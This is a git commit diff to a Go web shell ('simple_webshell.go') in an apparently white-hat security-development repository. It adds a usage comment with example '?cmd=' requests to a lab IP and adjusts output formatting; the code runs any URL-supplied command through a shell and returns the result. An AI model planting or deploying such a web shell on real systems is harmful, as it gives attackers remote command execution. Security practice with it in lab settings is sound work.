ae0fa17b38ad853d4b0bfb2ed64b3e4436d3b863
TesterCC <testerlyx@foxmail.com>
2021-07-21 11:29:25 +0800

    udpate - go webshell

--- whitehat_sec_dev/simple_webshell.go
+++ whitehat_sec_dev/simple_webshell.go
@@ -13,9 +13,18 @@ var (
 	addr     string
 )
 
+/*
+Test on Kali 2021
+In linux terminal:
+./simple_webshell 0.0.0.0:80
+
+http://10.0.4.144/?cmd=echo 7 > flag.txt
+http://10.0.4.144/?cmd=cat flag.txt
+ */
+
 func main() {
 	if len(os.Args) != 2 {
-		fmt.Printf("Usage: %s <listenAddress> \n", os.Args[0])
+		fmt.Printf("Usage: %s <listenAddress:listenPort> \n", os.Args[0])
 		os.Exit(1)
 	}
 
@@ -34,6 +43,6 @@ func requestHandler(w http.ResponseWriter, r *http.Request) {
 
 	command := exec.Command(shell, shellArg, cmd)
 	output, err := command.Output()
-	_, err = w.Write([]byte(fmt.Sprintf("cmd: %v, result: \n%v\n", cmd, string(output))))
+	_, err = w.Write([]byte(fmt.Sprintf("cmd: %v \nresult: \n%v\n", cmd, string(output))))
 	_ = err
 }
